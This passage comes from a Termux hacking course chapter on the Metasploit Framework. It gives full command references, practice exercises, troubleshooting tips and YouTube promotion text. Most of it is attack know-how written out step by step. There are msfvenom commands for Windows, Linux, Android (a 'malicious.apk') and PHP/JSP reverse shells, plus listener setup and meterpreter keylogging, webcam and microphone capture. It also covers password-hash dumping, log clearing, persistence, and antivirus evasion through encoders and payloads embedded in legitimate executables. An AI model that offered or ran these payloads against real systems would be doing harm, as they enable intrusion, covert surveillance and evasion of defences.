shutdown             # Shutdown system
reboot               # Reboot system
```

#### File System Commands

```bash
pwd                  # Current directory
ls                   # List files
cd <path>            # Change directory
cat <file>           # Read file
download <file>      # Download file from target
upload <file>        # Upload file to target
edit <file>          # Edit file
mkdir <dir>          # Create directory
rm <file>            # Delete file
rmdir <dir>          # Delete directory
search -f <pattern>  # Search for files
```

#### Network Commands

```bash
ipconfig             # Network interfaces
netstat              # Network connections
route                # Routing table
portfwd add -l <port> -p <target_port> -r <target_ip>  # Port forward
```

#### Privilege Commands

```bash
getsystem            # Try to get SYSTEM privileges
getprivs             # Get available privileges
rev2self             # Revert to original token
steal_token <pid>    # Steal token from process
drop_token           # Drop current token
```

#### Information Gathering

```bash
hashdump            # Dump password hashes
run post/windows/gather/enum_system     # System enumeration
run post/windows/gather/enum_network    # Network enumeration
run post/windows/gather/enum_applications  # Installed apps
run post/windows/gather/credentials/gpp # GPP passwords
```

#### Surveillance

```bash
screenshot           # Take screenshot
keyscan_start        # Start keylogger
keyscan_dump         # Dump keystrokes
keyscan_stop         # Stop keylogger
webcam_list          # List webcams
webcam_snap          # Take photo
record_mic           # Record microphone
```

#### Android Specific

```bash
dump_calllog         # Get call logs
dump_contacts        # Get contacts
dump_sms             # Get SMS messages
geolocate            # Get GPS location
wlan_geolocate       # WiFi-based location
```

#### Session Management

```bash
background           # Background current session
run persistence ...  # Install persistence
clearev              # Clear event logs
exit                 # Close session
```

---

## 📋 COMMANDS REFERENCE

### Msfconsole Commands

```bash
# Starting Metasploit
msfconsole                           # Start interactive console
msfconsole -q                        # Start without banner
msfconsole -x "command"              # Execute command on start
msfconsole -r script.rc              # Run resource script

# Navigation
help                                 # Show all commands
?                                    # Same as help
version                              # Show version
banner                               # Display banner

# Module Management
show exploits                        # List exploits
show payloads                        # List payloads
show auxiliary                       # List auxiliary modules
show encoders                        # List encoders
show post                            # List post modules
show nops                            # List NOP generators
show all                             # List all modules
show missing                         # Show missing modules

# Search Commands
search <keyword>                     # Basic search
search type:exploit <keyword>        # Search by type
search platform:windows <keyword>    # Search by platform
search cve:2021 <keyword>            # Search by CVE
search app:apache                    # Search by application
search name:<pattern>                # Search by name
search author:<name>                 # Search by author
search rank:excellent                # Search by reliability rank

# Module Selection
use <module_path>                    # Select module
use <number>                         # Select by search result number
info                                 # Show module info
info <module_path>                   # Show info without selecting

# Module Configuration
show options                         # Show module options
show advanced                        # Show advanced options
show evasion                         # Show evasion options
show targets                         # Show available targets
show payloads                        # Show compatible payloads

set <option> <value>                 # Set option
setg <option> <value>                # Set global option
unset <option>                       # Unset option
unsetg <option>                      # Unset global option
set PAYLOAD <payload>                # Set payload

# Execution
check                                # Check if vulnerable
exploit                              # Run exploit
run                                  # Same as exploit
exploit -j                           # Run as background job
exploit -z                           # Don't interact with session
rerun                                # Rerun exploit
recheck                              # Recheck vulnerability

# Session Management
sessions                             # List sessions
sessions -l                          # List sessions (verbose)
sessions -i <id>                     # Interact with session
sessions -k <id>                     # Kill session
sessions -K                          # Kill all sessions
sessions -u <id>                     # Upgrade shell to meterpreter
sessions -d <id>                     # Detach from session
jobs                                 # List background jobs
jobs -k <id>                         # Kill job

# Database Commands
db_status                            # Check database connection
db_connect                           # Connect to database
db_disconnect                        # Disconnect from database
workspace                            # List workspaces
workspace -a <name>                  # Add workspace
workspace -d <name>                  # Delete workspace
workspace <name>                     # Switch workspace
hosts                                # List hosts
hosts -S <filter>                    # Search hosts
services                             # List services
services -S <filter>                 # Search services
creds                                # List credentials
loot                                 # List loot
notes                                # List notes
vulns                                # List vulnerabilities
db_import <file>                     # Import scan results
db_export -f xml <file>              # Export database

# Resource Scripts
resource <file.rc>                   # Run resource script
makerc <file.rc>                     # Save commands to script

# Miscellaneous
back                                 # Go back from module
connect <host> <port>                # Connect to host
irb                                  # Open IRB shell
load <plugin>                        # Load plugin
unload <plugin>                      # Unload plugin
save                                 # Save current settings
spool <file>                         # Log output to file
```

### Msfvenom Commands

```bash
# List available options
msfvenom --list payloads             # List payloads
msfvenom --list encoders             # List encoders
msfvenom --list nops                 # List NOPs
msfvenom --list platforms            # List platforms
msfvenom --list archs                # List architectures
msfvenom --list formats              # List output formats
msfvenom -l payloads                 # Short form

# Payload Generation - Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.1.100 LPORT=4444 -f exe -o bind.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o cmd.exe

# Payload Generation - Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64.elf

# Payload Generation - Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o malicious.apk

# Payload Generation - Web
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.sh

# Payload Generation - Scripting Languages
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py
msfvenom -p perl/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.pl
msfvenom -p ruby/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.rb

# Encoding Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Bad Characters
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -b '\x00\x0a\x0d' -f exe -o shell.exe

# Custom Template
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x custom.exe -k -f exe -o embedded.exe

# Stageless Payloads
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o stageless.exe

# Multiple Encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -e x86/countdown -i 3 -f exe -o multiencoded.exe

# Get Payload Info
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# Smaller Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -s 500 -f exe -o small.exe
```

### Meterpreter Commands

```bash
# Core Commands
? / help                    # Show help
background                  # Background session
channel                     # Display channels
close                       # Close channel
exit / quit                 # Terminate session
interact                    # Interact with channel
irb                         # Open Ruby shell
load                        # Load extension
machine_id                  # Get machine ID
migrate                     # Migrate to process
quit                        # Quit session
run                         # Run meterpreter script
use                         # Use extension

# File System Commands
cat                         # Read file
cd                          # Change directory
checksum                    # Get file checksum
chmod                       # Change permissions
del                         # Delete file
dir                         # List directory
download                    # Download file
edit                        # Edit file
getwd / pwd                 # Current directory
ls                          # List files
mkdir                       # Create directory
mv                          # Move file
rm                          # Delete file
rmdir                       # Remove directory
search                      # Search files
show_mount                  # List mounts
upload                      # Upload file

# Networking Commands
arp                         # ARP cache
getproxy                    # Get proxy config
ifconfig / ipconfig         # Network interfaces
netstat                     # Network connections
portfwd                     # Port forwarding
resolve                     # Resolve hostname
route                       # Routing table

# System Commands
clearev                     # Clear event logs
drop_token                  # Drop token
execute                     # Execute command
getenv                      # Get environment
getpid                      # Get process ID
getpid                      # Process ID
getprivs                    # Get privileges
getsid                      # Get SID
getuid                      # Get user ID
kill                        # Kill process
localtime                   # Local time
pgrep                       # Grep processes
pkill                       # Kill by name
ps                          # List processes
reboot                      # Reboot system
reg                         # Registry commands
rev2self                    # Revert token
shell                       # Open shell
shutdown                    # Shutdown system
steal_token                 # Steal token
suspend                     # Suspend process
sysinfo                     # System info

# User Interface Commands
enumdesktops                # List desktops
getdesktop                  # Get current desktop
idletime                    # Idle time
keyscan_dump                # Dump keystrokes
keyscan_start               # Start keylogger
keyscan_stop                # Stop keylogger
screenshot                  # Screenshot
setdesktop                  # Set desktop
uictl                       # UI control

# Webcam Commands
record_mic                  # Record mic
webcam_chat                 # Video chat
webcam_list                 # List webcams
webcam_snap                 # Take photo
webcam_stream               # Stream video

# Elevate Commands
getsystem                   # Get SYSTEM
getsystem -h                # Help

# Password Database Commands
hashdump                    # Dump hashes
load kiwi                   # Load Mimikatz

# Android Commands
activity_start              # Start activity
check_root                 # Check root
dump_calllog               # Dump call log
dump_contacts              # Dump contacts
dump_sms                   # Dump SMS
geolocate                  # Get location
hide_app_icon              # Hide app icon
send_sms                   # Send SMS
set_audio_mode             # Set audio mode
sql_query                  # Query database
wakelock                   # Wake lock
wlan_geolocate             # WiFi location

# Post Modules
run post/windows/gather/hashdump
run post/windows/gather/enum_system
run post/windows/gather/enum_applications
run post/windows/gather/enum_network
run post/windows/gather/enum_shares
run post/windows/gather/credentials/gpp
run post/windows/gather/credentials/chrome
run post/windows/gather/credentials/mssql
run post/windows/gather/enum_av
run post/windows/gather/enum_patches
run post/multi/recon/local_exploit_suggester
run post/windows/manage/persistence
run post/windows/manage/enable_rdp
run post/multi/manage/autoroute
```

### Database Commands

```bash
# Database Setup
service postgresql start             # Start PostgreSQL
msfdb init                           # Initialize database
msfdb reinit                         # Reinitialize database
msfdb delete                         # Delete database

# Inside msfconsole
db_status                            # Check connection
db_connect <user>@<host>             # Connect to DB
db_disconnect                        # Disconnect

# Workspace Management
workspace                            # List workspaces
workspace -a <name>                  # Add workspace
workspace -d <name>                  # Delete workspace
workspace <name>                     # Switch workspace
workspace -h                         # Help

# Data Management
hosts                                # List hosts
hosts -S <filter>                    # Search hosts
hosts -d <ip>                        # Delete host
services                             # List services
services -S <filter>                 # Search services
services -p <port>                   # By port
services -u                          # Only up services
creds                                # List credentials
creds add user:<user> pass:<pass>    # Add credential
loot                                 # List loot
notes                                # List notes
vulns                                # List vulnerabilities

# Import/Export
db_import <file.xml>                 # Import scan
db_export -f xml backup.xml          # Export database
db_export -f pwdump backup.txt       # Export pwdump format

# Nmap Integration
db_nmap -sV -sC <target>             # Nmap scan to DB
nmap -sV -oX scan.xml <target>       # Export scan
db_import scan.xml                   # Import Nmap results
```

---

## 💻 PRACTICE EXERCISES

### Exercise 1: Metasploit Installation & Verification

```bash
# Task: Install Metasploit via Proot and verify installation

# Step 1: Update Termux
pkg update && pkg upgrade -y

# Step 2: Install proot-distro
pkg install proot-distro -y

# Step 3: Install Ubuntu
proot-distro install ubuntu

# Step 4: Login to Ubuntu
proot-distro login ubuntu

# Step 5: Update Ubuntu
apt update && apt upgrade -y

# Step 6: Install dependencies
apt install build-essential ruby-full git curl wget -y

# Step 7: Install Metasploit (using installer)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Step 8: Verify installation
msfconsole --version

# Step 9: Start msfconsole
msfconsole -q

# Step 10: Check database status (will show not connected, which is OK)
db_status

# Expected: Version output and msfconsole prompt
```

### Exercise 2: Module Exploration

```bash
# Task: Explore Metasploit modules

# Step 1: Start msfconsole
msfconsole -q

# Step 2: List available exploits
show exploits

# Step 3: Search for SMB exploits
search type:exploit platform:windows smb

# Step 4: Get info on a specific exploit
info exploit/windows/smb/ms17_010_eternalblue

# Step 5: Search for auxiliary scanners
search type:auxiliary scanner

# Step 6: List payloads
show payloads

# Step 7: Search for meterpreter payloads
search meterpreter

# Step 8: List encoders
show encoders

# Step 9: Search for Android payloads
search platform:android

# Step 10: Exit
exit

# Expected: Understanding of module organization
```

### Exercise 3: Payload Generation

```bash
# Task: Generate various payloads with msfvenom

# Step 1: List available payloads
msfvenom --list payloads | head -30

# Step 2: Generate Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o windows_shell.exe

# Step 3: Generate Linux payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o linux_shell.elf

# Step 4: Generate Android payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o android_shell.apk

# Step 5: Generate PHP payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o shell.php

# Step 6: Generate encoded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe

# Step 7: Verify payloads
ls -la *.exe *.elf *.apk *.php

# Expected: Multiple payload files created
```

### Exercise 4: Handler Setup

```bash
# Task: Configure a handler to receive connections

# Step 1: Start msfconsole
msfconsole -q

# Step 2: Use the handler module
use exploit/multi/handler

# Step 3: Set payload
set payload windows/meterpreter/reverse_tcp

# Step 4: Show options
show options

# Step 5: Set LHOST (your IP)
set LHOST 0.0.0.0

# Step 6: Set LPORT
set LPORT 4444

# Step 7: Verify settings
show options

# Step 8: Start handler (will wait for connections)
# exploit
# Note: This will wait indefinitely, press Ctrl+C to stop

# Expected: Handler configured and listening
```

### Exercise 5: Meterpreter Practice

```bash
# Task: Practice Meterpreter commands (in a simulated session)

# Note: This requires an active session, but practice commands:

# System Information
sysinfo
getuid
getpid

# Process Management
ps
migrate <pid>

# File System
pwd
ls
cd /tmp
download /etc/passwd

# Network
ipconfig
netstat
route

# Privilege
getsystem
getprivs

# Information Gathering
run post/windows/gather/enum_system
run post/windows/gather/hashdump

# Session Management
background

# List sessions
sessions -l

# Interact with session
sessions -i 1

# Expected: Familiarity with meterpreter commands
```

### Exercise 6: Search Techniques

```bash
# Task: Master the search command

# Start msfconsole
msfconsole -q

# Search by keyword
search ssh

# Search by type
search type:exploit ssh

# Search by platform
search platform:windows type:exploit

# Search by CVE
search cve:2021

# Search by specific CVE
search cve:2021-44228

# Search by application
search app:apache

# Combined search
search type:exploit platform:linux app:apache

# Search with name filter
search name:eternal

# Search by author
search author:hdm

# Search by reliability rank
search rank:excellent

# Expected: Proficiency in module searching
```

### Exercise 7: Post-Exploitation Modules

```bash
# Task: Explore post-exploitation capabilities

# Start msfconsole
msfconsole -q

# List post modules
show post

# Search for specific post modules
search post/windows/gather

# Info on a post module
info post/windows/gather/hashdump

# Note: To use post modules:
# use post/windows/gather/hashdump
# set SESSION 1
# run

# Useful post modules to know:
# post/windows/gather/enum_system
# post/windows/gather/enum_network
# post/windows/gather/credentials/gpp
# post/windows/manage/persistence
# post/multi/recon/local_exploit_suggester

# Expected: Knowledge of post-exploitation capabilities
```

### Exercise 8: Workspace Management

```bash
# Task: Practice database and workspace management

# Start msfconsole
msfconsole -q

# Check database status
db_status

# List workspaces
workspace

# Create new workspace
workspace -a pentest_project

# Switch workspace
workspace pentest_project

# Add another workspace
workspace -a test_project

# List workspaces
workspace

# Switch back to default
workspace default

# Delete a workspace
workspace -d test_project

# Expected: Understanding of workspace organization
```

---

## ⚠️ TROUBLESHOOTING

### Problem 1: Metasploit Won't Start

```bash
# Symptoms:
# - msfconsole command not found
# - Ruby errors on startup
# - Database connection errors

# Solution 1: Check if in Ubuntu proot
# You must be logged into Ubuntu:
proot-distro login ubuntu

# Solution 2: Verify installation
which msfconsole
msfconsole --version

# Solution 3: Check Ruby version
ruby --version
# Should be 2.7+

# Solution 4: Reinstall if needed
gem install msfconsole
# Or run full reinstallation
```

### Problem 2: Database Connection Failed

```bash
# Symptoms:
# - "Database not connected" error
# - Workspace commands not working

# Solution 1: Start PostgreSQL
service postgresql start

# Solution 2: Initialize database
msfdb init

# Solution 3: Reinitialize if corrupted
msfdb reinit

# Solution 4: Check PostgreSQL status
service postgresql status

# Solution 5: Manual database connection
msfconsole
msf6 > db_connect msf:msf@127.0.0.1/msf
```

### Problem 3: Payload Generation Errors

```bash
# Symptoms:
# - "Invalid payload" error
# - Missing template errors
# - Encoder not working

# Solution 1: Check payload syntax
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# Solution 2: Verify payload exists
msfvenom --list payloads | grep meterpreter

# Solution 3: Check required options
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe

# Solution 4: Use correct format
msfvenom --list formats | grep exe

# Solution 5: Check encoder compatibility
msfvenom --list encoders
```

### Problem 4: Handler Not Receiving Connections

```bash
# Symptoms:
# - Handler starts but no session
# - Connection timeouts
# - Session dies immediately

# Solution 1: Verify LHOST is correct
# LHOST should be YOUR IP (attacker machine)
set LHOST 192.168.1.50  # Your IP

# Solution 2: Check firewall
# Ensure port is not blocked
netstat -tulpn | grep 4444

# Solution 3: Use 0.0.0.0 for all interfaces
set LHOST 0.0.0.0

# Solution 4: Verify payload matches handler
# Payload in msfvenom must match handler payload
# If payload: windows/meterpreter/reverse_tcp
# Handler must use: windows/meterpreter/reverse_tcp

# Solution 5: Check network connectivity
ping target_ip
```

### Problem 5: Session Dies Quickly

```bash
# Symptoms:
# - Session opens but closes immediately
# - "Meterpreter session died"

# Solution 1: Migrate immediately
# When session opens:
meterpreter > run post/windows/manage/migrate

# Solution 2: Use persistent handler
set ExitOnSession false
exploit -j

# Solution 3: Set AutoRunScript
set AutoRunScript post/windows/manage/migrate

# Solution 4: Try different payload
set payload windows/meterpreter/reverse_https
```

### Problem 6: Proot-Distro Issues

```bash
# Symptoms:
# - Can't install Ubuntu
# - Login fails
# - Commands not working in proot

# Solution 1: Update proot-distro
pkg update
pkg upgrade proot-distro

# Solution 2: Reinstall distribution
proot-distro remove ubuntu
proot-distro install ubuntu

# Solution 3: Clear cache
rm -rf ~/.proot-distro

# Solution 4: Check storage
df -h
# Ensure enough space available

# Solution 5: Use different distro
proot-distro list
proot-distro install debian
```

### Problem 7: Msfconsole Slow/Freezing

```bash
# Symptoms:
# - Takes forever to load
# - Commands hang
# - No response

# Solution 1: Disable banner
msfconsole -q

# Solution 2: Disable database (if not needed)
msfconsole -n

# Solution 3: Use simpler payload
set payload windows/shell/reverse_tcp

# Solution 4: Check memory
free -h
# Metasploit needs significant RAM

# Solution 5: Kill stuck processes
jobs -l
kill %1
```

### Problem 8: Android Payload Not Working

```bash
# Symptoms:
# - APK generated but doesn't connect
# - App crashes on target
# - No session created

# Solution 1: Check permissions
# Target device must allow unknown sources

# Solution 2: Verify network
# Target must be able to reach your IP

# Solution 3: Use correct architecture
# Check target device architecture
adb shell getprop ro.product.cpu.abi

# Solution 4: Try different payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -o app.apk

# Solution 5: Check handler matches
set payload android/meterpreter/reverse_tcp
```

### Problem 9: Exploit Check Fails

```bash
# Symptoms:
# - Check command returns "unknown"
# - "The target is not exploitable"

# Solution 1: Verify target is up
set RHOSTS target_ip
ping target_ip

# Solution 2: Check port is open
nmap -p 445 target_ip

# Solution 3: Verify service version
nmap -sV -p 445 target_ip

# Solution 4: Try different exploit
search type:exploit platform:windows smb

# Solution 5: Run exploit anyway
# Sometimes check is unreliable
exploit
```

### Problem 10: Encoding Not Bypassing AV

```bash
# Symptoms:
# - Encoded payload still detected
# - Antivirus blocks execution

# Solution 1: Multiple encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Solution 2: Use different encoder
msfvenom --list encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/bloxor -f exe -o payload.exe

# Solution 3: Custom template
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x legitimate.exe -k -f exe -o payload.exe

# Solution 4: Use stager
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o stager.exe

# Solution 5: Consider other tools
# For serious AV bypass, consider:
# - Veil Framework
# - Shellter
# - Custom crypters

# Note: Modern AV is very good at detecting Metasploit payloads
```

---

## 🎬 VIDEO ASSETS

### Thumbnail Concepts

**Option A: Professional Dark Theme**
```
┌────────────────────────────────────┐
│  [Dark Red/Black Background]       │
│                                    │
│   💀 METASPLOIT FRAMEWORK          │
│   ────────────────────────────     │
│   Complete Guide for Termux        │
│                                    │
│   🔥 msfconsole                    │
│   🔥 msfvenom                      │
│   🔥 Meterpreter                   │
│                                    │
│   [T3rmuxk1ng Logo]                │
└────────────────────────────────────┘
```

**Option B: Eye-Catching Warning Style**
```
┌────────────────────────────────────┐
│  ⚠️ METASPLOIT BASICS ⚠️          │
│                                    │
│  ┌──────────┐    ┌──────────┐     │
│  │ msfvenom │    │ payload  │     │
│  │   💣     │    │   🎯     │     │
│  └──────────┘    └──────────┘     │
│                                    │
│  Exploitation Complete Guide       │
│  Chapter 35 | T3rmuxk1ng           │
└────────────────────────────────────┘
```

**Option C: Terminal Aesthetic**
```
┌────────────────────────────────────┐
│  [Black Terminal Background]       │
│                                    │
│  msf6 > use exploit/multi/...      │
│  msf6 > set LHOST 192.168.1.50     │
│  msf6 > exploit                    │
│  [*] Meterpreter session opened    │
│                                    │
│  🎯 METASPLOIT MASTERY             │
│  Chapter 35                        │
│  [T3rmuxk1ng]                      │
└────────────────────────────────────┘
```

### Video Description Template

```markdown
💀 Metasploit Framework Basics | Complete Termux Guide | Chapter 35

🔥 In this video you'll learn:
• Metasploit Framework introduction
• Proot-based installation in Termux
• Msfconsole interface & commands
• Msfvenom payload generation
• Meterpreter post-exploitation
• Handler setup for connections
• Windows & Android payload creation
• Encoding & evasion techniques

⏱️ Timestamps:
0:00 - Introduction
1:00 - Metasploit Introduction
4:00 - Termux + Metasploit Challenges
6:00 - Proot Installation
10:00 - Metasploit Installation
14:00 - Architecture Overview
17:00 - Msfconsole Basics
21:00 - Search Command Deep Dive
23:30 - Exploitation Workflow
26:30 - Payloads & Msfvenom
30:00 - Handler Setup
33:00 - Meterpreter Basics
37:00 - Post-Exploitation Modules
40:00 - Common Exploits Demo
44:00 - Android Payloads
47:00 - Encoding & Evasion
49:30 - Database Usage
52:00 - Best Practices & Summary

📥 Installation Commands:
pkg update && pkg upgrade -y
pkg install proot-distro -y
proot-distro install ubuntu
proot-distro login ubuntu
apt update && apt upgrade -y
# Follow video for complete installation

📝 Key Commands from Video:
msfconsole                    # Start console
search type:exploit platform:windows smb    # Search exploits
use exploit/windows/smb/ms17_010_eternalblue  # Select exploit
set RHOSTS target_ip          # Set target
set LHOST your_ip             # Set your IP
exploit                       # Run exploit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o shell.exe

📚 Full Course Playlist:
[PLAYLIST LINK]

📱 Follow T3rmuxk1ng:
• YouTube: @T3rmuxk1ng
• Telegram: [LINK]
• GitHub: [LINK]

#Metasploit #Termux #MetasploitFramework #EthicalHacking #Msfconsole #Msfvenom #Meterpreter #TermuxCourse #T3rmuxk1ng #PenetrationTesting #CyberSecurity

---
⚠️ DISCLAIMER: This video is for EDUCATIONAL PURPOSES ONLY. Use Metasploit only on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal. The creator is not responsible for misuse of this information.
```

### Tags List

```
metasploit, metasploit framework, metasploit tutorial, msfconsole, 
msfvenom, meterpreter, metasploit termux, metasploit hindi, 
metasploit tutorial hindi, ethical hacking, penetration testing, 
cyber security, hacking tools, exploit development, payload generation, 
windows exploit, android payload, reverse shell, bind shell, 
metasploit basics, metasploit commands, termux metasploit install,
proot metasploit, ubuntu metasploit, t3rmuxk1ng, termux course,
hindi tutorial, hacking course, security tools, vulnerability exploitation
```

### Hashtags

```
#Metasploit #MetasploitFramework #Msfconsole #Msfvenom #Meterpreter 
#EthicalHacking #PenetrationTesting #CyberSecurity #Termux 
#TermuxCourse #T3rmuxk1ng #HackingTools #PayloadGeneration 
#WindowsExploit #AndroidPayload #ReverseShell #HindiTutorial 
#MetasploitTutorial #LearnHacking #SecurityTools
```

---

## 📚 ADDITIONAL RESOURCES

### Official Resources

| Resource | Link |
|----------|------|
| Metasploit Official | https://www.metasploit.com/ |
| Metasploit Documentation | https://docs.metasploit.com/ |
| Rapid7 GitHub | https://github.com/rapid7/metasploit-framework |
| Metasploit Unleashed | https://www.offensive-security.com/metasploit-unleashed/ |

### Learning Resources

| Resource | Description |
|----------|-------------|
| Metasploit Unleashed | Free comprehensive course |
| Rapid7 Blog | Updates and tutorials |
| Metasploit Help | Run `help` in msfconsole |
| Module Info | Run `info <module>` |

### Useful Tools

| Tool | Purpose |
|------|---------|
| Veil Framework | AV evasion payloads |
| Shellter | PE injector |
| Armitage | GUI for Metasploit |
| Cobalt Strike | Advanced C2 |

### Module Ranks (Reliability)

| Rank | Description |
|------|-------------|
| Manual | Requires manual configuration |
| Low | Unreliable |
| Average | Normal reliability |
| Good | Good reliability |
| Excellent | Highest reliability |

---

## ✅ CHAPTER CHECKLIST

Before moving to Chapter 36, verify:

- [ ] Proot-distro installed and configured
- [ ] Ubuntu installed in proot
- [ ] Metasploit successfully installed
- [ ] msfconsole starts without errors
- [ ] Understand module types (exploits, payloads, etc.)
- [ ] Can search for modules effectively
- [ ] Know how to set options (RHOSTS, LHOST, payload)
- [ ] Can generate payloads with msfvenom
- [ ] Know how to set up a handler
- [ ] Familiar with meterpreter basic commands
- [ ] Understand exploitation workflow
- [ ] Know about encoding payloads
- [ ] Understand legal/ethical boundaries

---

## 🎯 NEXT CHAPTER PREVIEW

**Chapter 36: PhoneSploit & ADB Tools**

- ADB (Android Debug Bridge) introduction
- PhoneSploit installation and setup
- ADB commands for device management
- Remote device exploitation techniques
- Post-exploitation with ADB
- Screen mirroring and control
- File transfer with ADB
- ADB over network
- Security considerations

---

**Chapter Complete! 🎉**

*Created by T3rmuxk1ng | Termux Full Course*
